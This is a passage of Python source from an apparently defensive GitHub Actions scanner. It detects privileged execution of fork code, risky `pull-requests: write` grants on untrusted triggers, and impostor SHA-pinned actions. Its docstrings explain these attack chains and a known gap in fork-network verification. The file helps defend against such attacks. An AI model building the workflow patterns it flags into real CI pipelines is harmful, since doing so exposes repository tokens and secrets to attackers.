        if isinstance(uses, str) and uses.startswith("actions/checkout"):
            with_block = step.get("with")
            if isinstance(with_block, dict):
                for key in ("ref", "repository"):
                    if _attacker_head_ref(with_block.get(key)):
                        checkout_idx = i
                        ref_text = str(with_block.get(key))
                        break
        if checkout_idx is not None and i > checkout_idx:
            executes = "run" in step or (
                isinstance(step.get("uses"), str)
                and step["uses"].startswith("./")
            )
            if executes:
                return checkout_idx, ref_text
    return None


def _correlation_untrusted_checkout_executes(file_path: Path) -> Iterator[RawHit]:
    """P14.9 — fork code executed with privileges (the "pwn request" chain).

    Three conditions in ONE job: (1) the workflow runs on an untrusted-event
    trigger that carries the BASE repo's context (write token, secrets);
    (2) `actions/checkout` pulls the attacker's head code (`ref:` /
    `repository:` naming pull_request.head.*, github.head_ref, or
    workflow_run.head_*); (3) a later step in the same job executes from the
    working tree. One hit per qualifying job. The bare trigger without the
    head checkout is NOT a finding here — that presence fact belongs to the
    scored config checks.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = set(_on_trigger_names(on_node)) if on_node is not None else set()
    if not triggers & _UNTRUSTED_TRIGGERS:
        return
    trig = sorted(triggers & _UNTRUSTED_TRIGGERS)[0]
    for job_name, job in _walk_jobs(doc):
        hit = _job_checkout_head_then_executes(job)
        if hit is None:
            continue
        _, ref_text = hit
        line = _job_line_in_text(text, job_name)
        yield RawHit(
            line=line,
            evidence=(
                f"{line:>4}: job `{job_name}` on `{trig}` checks out "
                f"`{ref_text}` then executes from the tree <-- here"
                + _gate_note(job)
            ),
            match_text=job_name,
            derived=True,
        )


_UNTRUSTED_TRIGGERS = frozenset(
    {
        "pull_request_target",
        "issue_comment",
        "workflow_run",
        "issues",
        "pull_request_review",
        "pull_request_review_comment",
        "discussion",
        "discussion_comment",
        "fork",
        "watch",
        "repository_dispatch",
    }
)


_WALK_MAX_DEPTH = 64


def _walk_pull_requests_write(
    node: Any,
    path: tuple[str, ...] = (),
    depth: int = 0,
) -> Iterator[tuple[str, ...]]:
    """Yield the path-tuple of every `pull-requests: write` declaration.

    Bounded by ``_WALK_MAX_DEPTH`` to cap the worst case on pathological
    anchor-heavy YAML (where ``yaml.safe_load`` can produce a deeply
    self-similar object graph). At the cap we log a warning and stop
    descending — surface vs silent stack overflow.
    """
    if depth > _WALK_MAX_DEPTH:
        logger.warning(
            "_walk_pull_requests_write: recursion depth cap (%d) exceeded "
            "at path %r — stopping descent; deeper `pull-requests: write` "
            "declarations (if any) will not be reported",
            _WALK_MAX_DEPTH,
            path,
        )
        return
    if isinstance(node, dict):
        if (
            "pull-requests" in node
            and isinstance(node["pull-requests"], str)
            and node["pull-requests"].lower() == "write"
        ):
            yield path + ("pull-requests",)
        for k, v in node.items():
            yield from _walk_pull_requests_write(
                v, path + (str(k),), depth + 1
            )
    elif isinstance(node, list):
        for i, item in enumerate(node):
            yield from _walk_pull_requests_write(
                item, path + (str(i),), depth + 1
            )


def _find_pull_requests_write_line(lines: list[str]) -> int | None:
    """Best-effort line number for the actual `pull-requests: write` token.

    Scans `lines` for the literal ``pull-requests:`` key. Accepts two
    spellings:

      * Inline value on the same line:  ``pull-requests: write``
      * Block style with value on the next non-empty line:
        ``pull-requests:\\n          write``

    Returns the line of the first match; falls back to ``None`` so the
    caller can substitute the workflow-level ``permissions:`` line. This
    is strictly more accurate than the previous behavior of always
    reporting the workflow-level ``permissions:`` line, which is
    misleading when ``pull-requests: write`` is actually granted at job
    scope.
    """
    key_re = re.compile(r"^\s*pull-requests\s*:\s*(.*?)\s*(?:#.*)?$")
    for i, line in enumerate(lines, start=1):
        m = key_re.match(line)
        if not m:
            continue
        value = m.group(1)
        if value:
            if value.strip().strip('"').strip("'").lower() == "write":
                return i
            continue
        # block style — look ahead for the next non-empty, non-comment line.
        for j in range(i, len(lines)):
            nxt = lines[j].strip()
            if not nxt or nxt.startswith("#"):
                continue
            if nxt.strip().strip('"').strip("'").lower() == "write":
                return i
            break
    return None


def _correlation_pr_write_and_untrusted_trigger(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.18 — workflow has untrusted-event trigger AND `pull-requests: write`
    at any scope."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = set(_on_trigger_names(on_node)) if on_node is not None else set()
    untrusted = triggers & _UNTRUSTED_TRIGGERS
    if not untrusted:
        return
    pr_write_paths = list(_walk_pull_requests_write(doc))
    if not pr_write_paths:
        return
    sample_scope = ".".join(pr_write_paths[0])
    line = _find_pull_requests_write_line(text.splitlines()) or _find_line_for_top_level_key(
        text.splitlines(), "permissions"
    ) or 1
    yield RawHit(
        line=line,
        evidence=(
            f"{line:>4}: workflow triggers on {sorted(untrusted)} AND "
            f"grants `pull-requests: write` at scope `{sample_scope}` <-- here"
        ),
        match_text=sample_scope,
        derived=True,
    )


# Correlation function dispatch tables — METADATA's `correlation:` key
# names one of these. The type alias documents (and lets a type checker
# enforce) that each value is a callable from a workflow `Path` to a
# stream of `RawHit`s. `_FILE_CHECKS` shares the same signature but is
# called with the repo root rather than a workflow path; treating both
# as `Callable[[Path], Iterator[RawHit]]` keeps catalog validation
# uniform.
_Correlation = Callable[[Path], Iterator[RawHit]]

_JOB_CORRELATIONS: dict[str, _Correlation] = {
    "credential-file-in-cache-or-artifact": _correlation_credential_file_in_cache_or_artifact,
    "install-scripts-in-privileged-job": _correlation_install_scripts_in_privileged_job,
}
_WORKFLOW_CORRELATIONS: dict[str, _Correlation] = {
    "untrusted-trigger-writes-cache": _correlation_untrusted_trigger_writes_cache,
    "pr-write-and-untrusted-trigger": _correlation_pr_write_and_untrusted_trigger,
    "untrusted-checkout-executes": _correlation_untrusted_checkout_executes,
}


# -----------------------------------------------------------------------------
# repo-file-check: reads a file outside .github/workflows/
# -----------------------------------------------------------------------------


_FILE_CHECKS: dict[str, _Correlation] = {
    # Empty since the critical-only descope: the presence-shaped repo-file
    # checks (scanner-installed, tag-pin audit, CODEOWNERS) left the catalog —
    # promoted to scored config facts or dropped. The
    # repo-file-check detector machinery stays for future catalog entries.
}


def _validate_catalog_dispatch(entries: list[CatalogEntry]) -> list[CatalogEntry]:
    """Raise if any correlation/file_check identifier is unknown.

    Catches METADATA typos at catalog load time rather than at scan time.
    Dropping the entry instead would delete a whole chain from the scan
    while the report still claimed full coverage, so an unresolvable
    dispatch id fails the load outright.
    """
    for entry in entries:
        if entry.detector == "yaml-job-correlated":
            if entry.correlation not in _JOB_CORRELATIONS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown correlation "
                    f"{entry.correlation!r} for {entry.detector}"
                )
        elif entry.detector == "yaml-workflow-correlated":
            if entry.correlation not in _WORKFLOW_CORRELATIONS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown correlation "
                    f"{entry.correlation!r} for {entry.detector}"
                )
        elif entry.detector == "repo-file-check":
            if entry.file_check not in _FILE_CHECKS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown file_check "
                    f"{entry.file_check!r} for {entry.detector}"
                )
    return entries


def _prefetch_activity(
    repo: str, workflow_files: list[Path], root: Path, max_workers: int = 12,
) -> dict[str, dict[str, Any]]:
    """Concurrently fetch workflow activity for every workflow file.

    Activity enrichment is one network-latency-bound gh API call per
    workflow. Done serially (the old inline-in-the-detector-loop path) it
    dominated scan time — ~2s × N workflows. The calls are independent and
    read-only, so a bounded thread pool collapses N round-trips into roughly
    one. Returns ``{rel_path: activity_dict}``; a per-workflow failure is
    captured as ``{"status": "unavailable", ...}`` (never raised), so one bad
    call can't abort the whole scan while still reading as "checked and
    failed" rather than "never attempted".
    """
    if not workflow_files:
        return {}

    def _one(wf: Path) -> tuple[str, dict[str, Any]]:
        rel = str(wf.relative_to(root))
        try:
            return rel, fetch_workflow_activity(
                repo, wf.name, workflow_call_only=_is_workflow_call_only(wf),
            )
        # One workflow's failure must not abort the scan — but it must NOT
        # collapse to `{}` either: `{}` means "enrichment never ran" (no
        # --repo), and the report reads that as no data rather than a failed
        # check, so a rate-limited workflow would silently look active.
        except (OSError, ValueError, RuntimeError, subprocess.SubprocessError) as e:
            logger.warning("activity prefetch failed for %s: %s", rel, e)
            return rel, {"status": "unavailable", "reason": str(e)}

    workers = min(max_workers, len(workflow_files))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        return dict(ex.map(_one, workflow_files))


# Anchored at the start of the (comment-stripped) line: a pin is a step's
# `uses:` KEY, optionally introduced by the `- ` list dash. Anchoring — rather
# than searching anywhere in the line — is what keeps commented-out pins
# (`# - uses: old/action@<sha>`) and `uses:` text quoted inside a `run:` block
# scalar (`echo "uses: evil/repo@<sha>"`) out of the pin set. Both would
# otherwise become network-checked, and a 404 on either would render as a
# CRITICAL impostor finding pointing at a line that is not an action reference.
_USES_SHA_LINE_RE = re.compile(
    r"^\s*(?:-\s*)?uses\s*:\s*[\"']?"
    r"([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)(?:/[^@\s\"']+)?@([0-9a-fA-F]{40})\b"
)


def _strip_yaml_comment(line: str) -> str:
    """Drop a trailing `#` comment. Safe for this regex's alphabet: neither an
    `owner/repo[/path]` nor a 40-hex sha can contain `#`, so cutting at the
    first `#` never truncates a real pin — it only removes the commentary
    after it (`uses: a/b@<sha>  # v4.1.1` keeps its pin)."""
    idx = line.find("#")
    return line if idx < 0 else line[:idx]


# The same shape, matched against a `uses:` VALUE already extracted from the
# parsed YAML (so quoting, folded scalars and flow style are already resolved).
_PIN_VALUE_RE = re.compile(
    r"^([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)(?:/[^@\s]+)?@([0-9a-fA-F]{40})$"
)


def _walk_uses_values(node: Any, depth: int = 0) -> Iterator[str]:
    """Every `uses:` string value in a parsed workflow, in document order.

    Covers step `uses:` and job-level `uses:` (reusable workflows) at any
    nesting depth. Bounded by ``_WALK_MAX_DEPTH`` like the other walkers —
    and, like them, the cap is announced: pins below it are never checked,
    which for a network-gated detector reads as clean.
    """
    if depth > _WALK_MAX_DEPTH:
        logger.warning(
            "_walk_uses_values: recursion depth cap (%d) exceeded — stopping "
            "descent; deeper `uses:` pins (if any) will NOT be collected or "
            "impostor-checked",
            _WALK_MAX_DEPTH,
        )
        return
    if isinstance(node, dict):
        value = node.get("uses")
        if isinstance(value, str):
            yield value.strip()
        for child in node.values():
            yield from _walk_uses_values(child, depth + 1)
    elif isinstance(node, list):
        for item in node:
            yield from _walk_uses_values(item, depth + 1)


def _sha_line_candidates(text: str, sha: str) -> list[int]:
    """Line numbers whose code (comments stripped) contains `sha`, in order.

    A 40-hex sha is effectively unique within a workflow, so this locates a
    pin's line exactly — including when the value sits on a folded-scalar
    continuation line, where the `uses:` key is on a different line.
    """
    lines = text.splitlines()
    hits = [i for i, line in enumerate(lines, start=1)
            if sha in _strip_yaml_comment(line).lower()]
    if hits:
        return hits
    # Only a commented-out occurrence — fall back to it rather than losing
    # the line number entirely.
    return [i for i, line in enumerate(lines, start=1) if sha in line.lower()]


def _collect_sha_pins(
    root: Path, workflow_files: list[Path]
) -> list[tuple[str, int, str, str]]:
    """Every `uses: owner/repo[/path]@<40-hex>` pin: (rel_file, line, repo, sha).

    Pins come from the PARSED workflow, not from a line scan, because the two
    failure directions both matter for a network-gated critical check:

    * a line scan collects things that are not action references — a
      commented-out `# - uses: old/action@<sha>` or a `uses:` string quoted
      inside a `run:` block — and a 404 on either renders as a CRITICAL
      impostor finding on a line that pins nothing;
    * a line scan misses references that are not written on one line —
      a folded scalar (`uses: >-` with the value below) or flow style
      (`- {uses: owner/repo@<sha>}`) — and a missed pin is a silent clean.

    Parsing answers both: the walk sees resolved `uses:` values only. Line
    numbers stay exact by locating the sha itself in the text. Local (`./…`)
    and `docker://` references never match the pin shape. If a workflow does
    not parse, fall back to the anchored line regex rather than dropping its
    pins (an unparseable file is already surfaced as a coverage gap).
    """
    pins: list[tuple[str, int, str, str]] = []
    for wf in workflow_files:
        text = _read_text_safe(wf)
        if not text:
            continue
        rel = str(wf.relative_to(root))
        doc = _parse_yaml_text(text, wf)
        if not isinstance(doc, dict):
            for lineno, line in enumerate(text.splitlines(), start=1):
                m = _USES_SHA_LINE_RE.match(_strip_yaml_comment(line))
                if m:
                    pins.append((rel, lineno, m.group(1), m.group(2).lower()))
            continue
        used_lines: dict[str, int] = {}
        for value in _walk_uses_values(doc):
            m = _PIN_VALUE_RE.match(value)
            if not m:
                continue
            sha = m.group(2).lower()
            candidates = _sha_line_candidates(text, sha)
            idx = used_lines.get(sha, 0)
            # Repeats of one pin consume successive occurrences; past the end,
            # reuse the last known line rather than inventing one.
            lineno = candidates[min(idx, len(candidates) - 1)] if candidates else 1
            used_lines[sha] = idx + 1
            pins.append((rel, lineno, m.group(1), sha))
    return pins


@lru_cache(maxsize=None)
def _gh_repo_visible(repo: str) -> bool:
    """Can this `gh` identity see `repo` at all? The commit endpoint answers
    404 both for 'the canonical repo never contained this commit' (the
    impostor chain) AND for 'you cannot see this repo' — GitHub returns 404,
    not 403, for private resources. Without this probe, a private/internal
    shared-action repo the running token lacks access to would be reported as
    a CRITICAL impostor finding."""
    try:
        result = subprocess.run(
            ["gh", "api", f"repos/{repo}", "--silent"],
            capture_output=True, text=True, timeout=30,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False
    return result.returncode == 0


_SHA40_RE = re.compile(r"[0-9a-f]{40}")

# An annotated tag may point at another tag object. Real repos never nest more
# than once or twice; the bound just stops a malicious or broken cycle.
_MAX_TAG_PEEL_DEPTH = 5


def _gh_commit_probe(repo: str, sha: str) -> bool | None:
    """Raw `repos/{repo}/commits/{sha}` verdict: True (present), False (the API
    says absent or unprocessable), None (unknowable — network, rate limit, auth).
    """
    try:
        result = subprocess.run(
            ["gh", "api", f"repos/{repo}/commits/{sha}", "--silent"],
            capture_output=True, text=True, timeout=30,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
    if result.returncode == 0:
        return True
    stderr = result.stderr or ""
    if "HTTP 404" in stderr or "Not Found" in stderr or "HTTP 422" in stderr:
        return False
    logger.debug("impostor check inconclusive for %s@%s: %s", repo, sha, stderr.strip())
    return None


def _gh_peel_tag_object(repo: str, sha: str) -> tuple[str | None, bool]:
    """Peel `sha` as an annotated TAG object in `repo`.

    Returns ``(peeled_commit_sha, answered)``. ``answered=True`` means "the API
    gave us a real answer about this object"; ``answered=False`` means "we do
    not know", which degrades to unverified rather than manufacturing an
    accusation out of a transient error — the exact class of false accusation
    this check exists to avoid.

    Branch by branch:

    - tag peels to a ``commit`` object → ``(commit_sha, True)``.
    - explicit 404/422 from ``git/tags`` → ``(None, True)``. This is the ONLY
      way this function reports an absence: the API said there is no such tag
      object here.
    - any other non-zero exit (rate limit, auth, 5xx) → ``(None, False)``.
    - ``TimeoutExpired`` / ``FileNotFoundError`` (no gh on PATH) →
      ``(None, False)``.
    - malformed / non-JSON body, or an ``object.sha`` that is not 40 hex →
      ``(None, False)``. We asked and got noise; noise is not an absence.
    - tag target is neither ``commit`` nor ``tag`` → ``(None, False)``.
    - cycle detected, or ``_MAX_TAG_PEEL_DEPTH`` exhausted → ``(None, False)``.
      "We gave up walking this chain" is not "the object is absent"; returning
      True there rendered a broken or unusually deep tag chain as an impostor
      accusation.

    `repos/{repo}/commits/{sha}` answers 404/422 for a tag object's own sha, so
    a workflow pinned to the sha of an annotated release tag — which real
    actions publish (astral-sh/setup-uv, pnpm/action-setup) — would otherwise be
    reported as a fork-only or dangling commit. It is a legitimate pin to an
    object the canonical repo really contains.
    """
    seen: set[str] = set()
    current = sha
    for _ in range(_MAX_TAG_PEEL_DEPTH):
        if current in seen:
            logger.debug(
                "tag peel cycled at %s@%s — unresolved, not an absence",
                repo, current,
            )
            return None, False
        seen.add(current)
        try:
            result = subprocess.run(
                ["gh", "api", f"repos/{repo}/git/tags/{current}"],
                capture_output=True, text=True, timeout=30,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None, False
        if result.returncode != 0:
            stderr = result.stderr or ""
            definitive = (
                "HTTP 404" in stderr or "Not Found" in stderr
                or "HTTP 422" in stderr
            )
            if not definitive:
                logger.debug(
                    "tag peel inconclusive for %s@%s: %s",
                    repo, current, stderr.strip(),
                )
            return None, definitive
        try:
            obj = (json.loads(result.stdout or "{}") or {}).get("object") or {}
            target_type = obj.get("type")
            target_sha = obj.get("sha")
        except (ValueError, TypeError, AttributeError):
            return None, False
        if not isinstance(target_sha, str) or not _SHA40_RE.fullmatch(target_sha):
            return None, False
        if target_type == "commit":
            return target_sha, True
        if target_type != "tag":
            # A tag pointing at a tree or a blob: we cannot follow it to a
            # commit, but the canonical repo did serve the object. "Cannot
            # resolve" is not "absent".
            logger.debug(
                "tag %s@%s targets a %r — unresolved, not an absence",
                repo, current, target_type,
            )
            return None, False
        current = target_sha
    logger.debug(
        "tag peel exceeded depth %d for %s@%s — unresolved, not an absence",
        _MAX_TAG_PEEL_DEPTH, repo, sha,
    )
    return None, False


def _gh_commit_in_repo(repo: str, sha: str) -> bool | None:
    """Does the canonical `repo` contain the object this workflow pins?
    True/False, or None when the answer is unknowable right now (network error,
    rate limit, a repo this identity cannot see) — an unknown must never be
    reported as either clean or impostor.

    A pin may name a commit OR an annotated tag object. A tag is peeled to the
    commit it points at and that commit is re-probed.

    KNOWN LIMITATION, measured rather than assumed: BOTH endpoints answer about
    the fork NETWORK, not about this repository. `repos/octocat/Hello-World/
    commits/c5a5e51…` returns 200 for a commit that lives only in a fork and is
    reachable from no upstream branch (re-confirmed on `github/gitignore`). So
    a 200 is not proof of canonical containment, and an impostor object planted
    in a fork of the action's own repo reads CLEAN here. What this check
    reliably catches is the pin that resolves to NOTHING in the network at all
    — a deleted, dangling or never-pushed object, the tj-actions shape. Closing
    the fork gap needs a ref-reachability test this API does not offer; see the
    catalog's P14.11 limitation note. The peel still matters: it stops a
    legitimate annotated-release pin from being called an impostor.
    """
    verdict = _gh_commit_probe(repo, sha)
    if verdict is not False:
        return verdict
    # 422 = malformed sha for this repo; 404 = object absent OR repo invisible.
    # Only claim "impostor" once we've confirmed we can actually see the repo —
    # one extra cached call, on the flag path only.
    if not _gh_repo_visible(repo):
        logger.debug(
            "impostor check inconclusive for %s@%s: repo not visible to this "
            "gh identity (private or nonexistent) — not flagged", repo, sha,
        )
        return None
    peeled, answered = _gh_peel_tag_object(repo, sha)
    if peeled is None:
        # No tag object here → the pin really is unreachable. But if the peel
        # never got an answer, we do not know that, and say so.
        return False if answered else None
    logger.debug(
        "%s@%s is an annotated tag object peeling to %s — re-probing that commit",
        repo, sha, peeled,
    )
    # A SERVED tag object is NOT proof of canonical containment: GitHub shares
    # ONE object store across a whole fork network, so `git/tags/{sha}` will
    # happily serve a tag object an attacker created in a fork of this repo.
    # The commit probe is no stronger — see the docstring's measured note; it is
    # simply the narrower of the two questions we can ask, and the only one
    # whose NEGATIVE answer is trustworthy.
    #
    # So the re-probe is the whole verdict, and it has three outcomes, not two:
    #   True  → the peeled commit resolves in the network: nothing to flag on
    #           the evidence available.
    #   False → the tag points at a commit that resolves nowhere — not in this
    #           repo, not anywhere in its fork network: flag it.
    #   None  → we could not tell (network, rate limit): UNVERIFIED. We hold no
    #           independent proof to fall back on, so claiming "verified" here
    #           would assert containment we never established.
    return _gh_commit_probe(repo, peeled)


def _impostor_sha_findings(
    entry: "CatalogEntry", root: Path, workflow_files: list[Path]
) -> tuple[list[tuple[str, RawHit]], str, list[str]]:
    """Run the P14.11 network-gated check.

    Returns ``(hits, status_line, unverified)``: per-file hits as
    ``(rel_file, RawHit)`` tuples, the status recorded in ``gh_checks``,
    and the pins whose verdict was unknowable this run (``repo@sha
    (file:line)``). One cached gh call per unique (repo, sha); every
    occurrence of a flagged pin becomes a hit.

    A run with ANY unknown verdict reports ``partial:``, not ``ran:`` —
    "verified" may only ever be asserted of pins the check actually
    resolved, and the report must be able to name the ones it could not.
    """
    pins = _collect_sha_pins(root, workflow_files)
    if not pins:
        return [], "ran: no sha-pinned actions found", []
    unique = sorted({(repo, sha) for _, _, repo, sha in pins})
    verdicts: dict[tuple[str, str], bool | None] = {}
    for repo, sha in unique:
        verdicts[(repo, sha)] = _gh_commit_in_repo(repo, sha)
    hits: list[tuple[str, RawHit]] = []
    unverified: list[str] = []
    unknowns = sum(1 for v in verdicts.values() if v is None)
    for rel, lineno, repo, sha in pins:
        verdict = verdicts[(repo, sha)]
        if verdict is False:
            hits.append((rel, RawHit(
                line=lineno,
                evidence=(
                    f"{lineno:>4}: uses: {repo}@{sha[:12]}… — commit NOT found in "
                    f"the canonical repo (fork-only or dangling object) <-- here"
                ),
                match_text=f"{repo}@{sha[:12]}",
                derived=True,
            )))
        elif verdict is None:
            unverified.append(f"{repo}@{sha[:12]}… ({rel}:{lineno})")
    verified = len(unique) - unknowns
    if unknowns:
        status = (
            f"partial: {verified} of {len(unique)} unique pin(s) verified, "
            f"{len(hits)} flagged, {unknowns} UNVERIFIED (network/rate-limit) "
            f"— not treated as clean"
        )
    else:
        status = f"ran: {len(unique)} unique pin(s) verified, {len(hits)} flagged"
    return hits, status, unverified


def _dedupe_occurrences(findings: list[Finding]) -> list[Finding]:
    """Collapse findings that name the same (pattern, file, line).

    Two template expressions on one line are one occurrence to fix, and SKILL.md
    calls the JSON the source of truth — so the duplicate cannot live only in
    the JSON with the renderer quietly collapsing it (sentry's
    frontend-snapshots.yml:66 was emitted twice and counted twice). Ids are
    renumbered so they stay contiguous.

    Collapsing is not the same as forgetting. Two DIFFERENT expressions on one
    line are still one occurrence to fix, but a finding that named only the
    first hid the second sink from the reader entirely. So every distinct
    ``match_text`` folded into a kept finding is named on its ``<-- here``
    marker; the transient ``_match_text`` key is stripped on the way out.
    """
    seen: dict[tuple[str, str, int], Finding] = {}
    texts: dict[str, list[str]] = {}
    kept: list[Finding] = []
    for f in findings:
        key = (f["pattern"], f["workflow_file"], f["line"])
        match_text = str(f.pop("_match_text", "") or "")
        if key in seen:
            logger.debug("dropping duplicate occurrence %s at %s:%s", *key)
            bucket = texts[id(seen[key])]
            if match_text and match_text not in bucket:
                bucket.append(match_text)
            continue
        seen[key] = f
        texts[id(f)] = [match_text] if match_text else []
        f["id"] = f"f{len(kept) + 1}"
        kept.append(f)
    for f in kept:
        found = texts.get(id(f)) or []
        if len(found) > 1:
            f["evidence"] = str(f.get("evidence") or "").replace(
                " <-- here", " <-- here: " + ", ".join(found), 1
            )
    return kept


_DEFAULT_GH_SKIP_REASON = "gh not authenticated (run gh auth login)"


def scan(
    catalog: list[CatalogEntry],
    root: Path,
    repo: str | None = None,
    gh_impostor: bool = False,
    gh_skip_reason: str = _DEFAULT_GH_SKIP_REASON,
) -> dict[str, Any]:
    _DROPPED_MATCHES.clear()
    _PARSE_FAILURES_LOGGED.clear()
    workflow_files = all_workflow_files(root)
    missed = _undiscovered_workflows(root, workflow_files)
    if missed:
        raise CoverageError(
            f"{len(missed)} workflow file(s) exist under {root}/.github/workflows "
            f"but were not discovered ({', '.join(missed[:5])}) — the scan would "
            f"report clean on files it never opened"
        )
    if not workflow_files:
        # Zero workflows is not a clean repo, it is nothing to grade: every
        # chain check would pass vacuously, the config facts would score a
        # workflow-less repo 83.3/100 and the report would render ten green
        # rows. Refuse exactly as a missing `.github/workflows` directory does.
        raise CoverageError(
            f"no workflow files found under {root}/.github/workflows — there is "
            f"nothing to scan, so every check would pass vacuously. This is a "
            f"coverage failure, not a clean repo"
        )
    logger.debug(
        "scan starting: %d catalog entries, %d workflow files under %s",
        len(catalog), len(workflow_files), root,
    )

    # Wall-clock anchor for end-to-end timing: report.py (always the last step)
    # computes total_run_s from this. It lives in scan.py — not just the run.py
    # driver — so the number is captured whether the orchestrator runs run.py or
    # invokes scan.py directly. Without this anchor, a direct-scan run silently
    # drops total_run_s (the failure mode that actually happened).
    _scan_start_epoch = time.time()
    _t_scan_start = time.monotonic()
    findings: list[Finding] = []
    finding_seq = 0
    activity_cache: dict[str, dict[str, Any]] = {}
    # Prefetch activity for every workflow concurrently up front (one gh call
    # each, independent and read-only) so the detector loop below reads a warm
    # cache instead of blocking ~2s per workflow inline.
    _t_enrich_start = time.monotonic()
    if repo:
        activity_cache = _prefetch_activity(repo, workflow_files, root)
    _enrich_s = time.monotonic() - _t_enrich_start

    # gh-impostor-sha runs once per pattern, network-gated. A skip is
    # recorded loudly in gh_checks — never a silent pass.
    gh_checks: dict[str, str] = {}
    # Per-check structured detail the status string can't carry — today the
    # list of pins the impostor check could not resolve, so the report can
    # name each one instead of hiding them behind a count.
    gh_check_details: dict[str, dict[str, Any]] = {}
    for entry in catalog:
        if entry.detector != "gh-impostor-sha":
            continue
        if not gh_impostor:
            gh_checks[entry.pattern] = (
                f"skipped: {gh_skip_reason} (network-gated check did NOT run)"
            )
            continue
        pin_hits, status, unverified = _impostor_sha_findings(
            entry, root, workflow_files
        )
        gh_checks[entry.pattern] = status
        if unverified:
            gh_check_details[entry.pattern] = {"unverified": unverified}
        for rel, hit in pin_hits:
            finding_seq += 1
            findings.append({
                "id": f"f{finding_seq}",
                "pattern": entry.pattern,
                "severity": entry.severity,
                "title": entry.title_template.format(
                    basename=rel.rsplit("/", 1)[-1], pattern=entry.pattern,
                    severity=entry.severity, match_text=hit.match_text,
                ),
                "workflow_file": rel,
                "line": hit.line,
                "affected_jobs": [],
                "workflow_activity": activity_cache.get(rel, {}),
                "evidence": hit.evidence,
                "evidence_kind": "derived" if hit.derived else "source",
                "fix_strategy": entry.fix_strategy,
                "fix_recipe_anchor": entry.anchor,
            })

    # repo-file-check runs once per pattern (not per workflow file).
    # Pop these out of the per-workflow loop below.
    for entry in catalog:
        if entry.detector != "repo-file-check":
            continue
        assert entry.file_check, "validated in __post_init__"
        check_fn = _FILE_CHECKS.get(entry.file_check)
        if check_fn is None:
            logger.warning(
                "Pattern %s: unknown file_check %r — skipping",
                entry.pattern, entry.file_check,
            )
            continue
        hits = list(check_fn(root))
        for hit in hits:
            finding_seq += 1
            findings.append({
                "id": f"f{finding_seq}",
                "pattern": entry.pattern,
                "severity": entry.severity,
                "title": entry.title_template.format(
                    basename="(repo)", pattern=entry.pattern,
                    severity=entry.severity, match_text=hit.match_text,
                ),
                "workflow_file": "(repo-wide)",
                "line": hit.line,
                "affected_jobs": [],
                "workflow_activity": {},
                "evidence": hit.evidence,
                "evidence_kind": "derived" if hit.derived else "source",
                "fix_strategy": entry.fix_strategy,
                "fix_recipe_anchor": entry.anchor,
            })

    for entry in catalog:
        if entry.detector in ("repo-file-check", "gh-impostor-sha"):
            continue  # already handled above
        if entry.detector == "manual":
            # Documentation-only pattern: not scanned; the catalog
            # section is reference material for human review.
            continue
        if not entry.affected_globs:
            continue

        candidates = [
            f for f in workflow_files
            if _path_matches_any_glob(
                str(f.relative_to(root)),
                entry.affected_globs,
            )
        ]
        logger.debug(
            "evaluating %s (%s) against %d candidate file(s)",
            entry.pattern, entry.detector, len(candidates),
        )

        for wf in candidates:
            rel = str(wf.relative_to(root))
            basename = wf.name

            if entry.detector == "regex":
                assert entry.match is not None  # validated in __post_init__
                hits = list(detect_regex(wf, entry.match))
            elif entry.detector == "yaml-path":
                assert entry.yaml_path is not None
                hits = list(
                    detect_yaml_path(wf, entry.yaml_path, entry.yaml_value)
                )
            elif entry.detector == "yaml-path-absent":
                assert entry.yaml_path is not None
                hits = list(detect_yaml_path_absent(wf, entry.yaml_path))
            elif entry.detector == "yaml-on-trigger":
                assert entry.trigger_keys is not None
                hits = list(detect_yaml_on_trigger(wf, entry.trigger_keys))
            elif entry.detector == "yaml-run-injection":
                assert entry.match is not None
                hits = list(detect_yaml_run_injection(wf, entry.match))
            elif entry.detector == "yaml-job-correlated":
                assert entry.correlation, "validated in __post_init__"
                corr_fn = _JOB_CORRELATIONS.get(entry.correlation)
                if corr_fn is None:
                    logger.warning(
                        "Pattern %s: unknown correlation %r — skipping",
                        entry.pattern, entry.correlation,
                    )
                    continue
                hits = list(corr_fn(wf))
            elif entry.detector == "yaml-workflow-correlated":
                assert entry.correlation, "validated in __post_init__"
                wcorr_fn = _WORKFLOW_CORRELATIONS.get(entry.correlation)
                if wcorr_fn is None:
                    logger.warning(
                        "Pattern %s: unknown correlation %r — skipping",
                        entry.pattern, entry.correlation,
                    )
                    continue
                hits = list(wcorr_fn(wf))
            else:
                continue

            logger.debug(
                "  %s: %d hit(s) on %s", entry.pattern, len(hits), rel,
            )
            if not hits:
                continue

            jobs = affected_jobs_for(wf)
            job_ranges = job_line_ranges(wf)
            if repo:
                if rel not in activity_cache:
                    activity_cache[rel] = fetch_workflow_activity(
                        repo, basename,
                        workflow_call_only=_is_workflow_call_only(wf),
                    )
                activity = activity_cache[rel]
            else:
                activity = {}

            for hit in hits:
                finding_seq += 1
                # A line-anchored hit affects the ONE job that contains it.
                # Stamping the file's whole job list on every occurrence read
                # as "all 22 of these jobs are affected" and contradicted the
                # finding's own evidence. A hit that sits outside every job
                # (workflow-scope permissions, triggers) really does affect
                # them all, and keeps the full list.
                #
                # `job_ranges is None` is a THIRD case: attribution could not
                # be computed at all. That also keeps the full list, but it is
                # not the same claim as "workflow-scope", so the finding
                # carries a note saying which one the reader is looking at.
                if job_ranges is None:
                    hit_jobs = jobs
                    jobs_note: str | None = (
                        "job attribution unavailable — this workflow's YAML "
                        "line marks could not be composed, so every job is "
                        "listed; this is not a claim that the finding is "
                        "workflow-scope"
                    )
                else:
                    containing_job = job_at_line(job_ranges, hit.line)
                    hit_jobs = [containing_job] if containing_job else jobs
                    jobs_note = None
                fmt_vars = {
                    "basename": basename,
